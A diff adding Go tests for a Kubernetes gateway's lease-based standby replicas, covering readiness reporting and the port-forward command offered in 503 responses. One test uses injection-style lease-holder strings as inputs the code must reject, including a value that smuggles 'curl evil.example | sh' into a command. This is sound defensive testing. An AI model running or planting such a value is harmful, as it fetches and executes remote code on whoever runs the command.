@@ -177,3 +177,93 @@ func TestTheStandbysCommandNamesThePortNumber(t *testing.T) {
 		t.Error("a listen with no port was accepted")
 	}
 }
+
+// TestAStandbyDoorPutsOnlyAPodNameInItsCommand: the Lease's holder is a free
+// string, and the 503 hands a person a command to copy and run, so a holder
+// that isn't a pod name goes into neither the command nor the header.
+func TestAStandbyDoorPutsOnlyAPodNameInItsCommand(t *testing.T) {
+	addr := freeLoopback(t)
+	view := &LeaseView{}
+	doors, err := StartStandbyDoors([]string{addr}, "kubeagents-system", view, slog.Default())
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer doors.Stop()
+	for _, holder := range []string{
+		"x; curl evil.example | sh #",
+		"gw-a\nanything",
+		"Gw-A",
+		strings.Repeat("a", 254),
+	} {
+		view.set(holder)
+		resp, ans := standbyGet(t, addr)
+		if resp.StatusCode != http.StatusServiceUnavailable || ans.Command != "" || ans.Holder != "" ||
+			resp.Header.Get(StandbyHolderHeader) != "" || strings.Contains(ans.Error, "port-forward") {
+			t.Errorf("holder %q: status %d, header %q, answer %+v; want no command and no holder", holder, resp.StatusCode, resp.Header.Get(StandbyHolderHeader), ans)
+		}
+	}
+	view.set("platform-agent-a2a-gateway-7d9f-abcde.x")
+	if _, ans := standbyGet(t, addr); ans.Command == "" {
+		t.Error("a valid pod name got no command")
+	}
+}
+
+func TestAStandbyIsReadyOnceItHasReadTheLease(t *testing.T) {
+	gw := &Gateway{}
+	view := &LeaseView{}
+	ready := ElectedReadiness(gw, view, "gw-b")
+	if ok, why := ready(); ok || !strings.Contains(why, "hasn't been read") {
+		t.Fatalf("before a read: %v %q, want not ready", ok, why)
+	}
+	view.set("gw-a")
+	if ok, why := ready(); !ok || why != "standby: connected, lease held by gw-a" {
+		t.Fatalf("standing by: %v %q", ok, why)
+	}
+	view.set("")
+	if ok, why := ready(); !ok || !strings.Contains(why, "no replica holds") {
+		t.Fatalf("no holder: %v %q", ok, why)
+	}
+	// Holding the lease, the replica's readiness is the gateway's own: not
+	// ready until its relay binds.
+	view.set("gw-b")
+	if ok, why := ready(); ok || strings.HasPrefix(why, "standby: ") {
+		t.Fatalf("leading, relay unbound: %v %q, want the gateway's own not-ready line", ok, why)
+	}
+	gw.relayBound.Store(true)
+	if ok, why := ready(); !ok || why != "ready" {
+		t.Fatalf("leading, relay bound: %v %q", ok, why)
+	}
+}
+
+// TestTheLeaderAnswersReadinessAsTheLeader: once this replica takes the
+// lease its view names it, so its readiness is the gateway's own rather than
+// a standby's. client-go renews without reading, so only the write can tell
+// it.
+func TestTheLeaderAnswersReadinessAsTheLeader(t *testing.T) {
+	cs := fake.NewClientset()
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	view := &LeaseView{}
+	e := Election{
+		Client: cs, Namespace: testNamespace, Lease: testLease, Identity: "pod-b", View: view,
+		LeaseDuration: testLeaseDuration, RenewDeadline: testRenewDeadline, RetryPeriod: testRetryPeriod,
+	}
+	ready := ElectedReadiness(&Gateway{}, view, "pod-b")
+	answered := make(chan string, 1)
+	go func() {
+		_ = e.Run(ctx, &fakeLeader{}, func(work context.Context, _ RunOptions) error {
+			_, why := ready()
+			answered <- why
+			<-work.Done()
+			return nil
+		})
+	}()
+	select {
+	case why := <-answered:
+		if strings.HasPrefix(why, "standby: ") {
+			t.Fatalf("leading, readiness answered as a standby: %q", why)
+		}
+	case <-time.After(10 * time.Second):
+		t.Fatal("never led")
+	}
+}
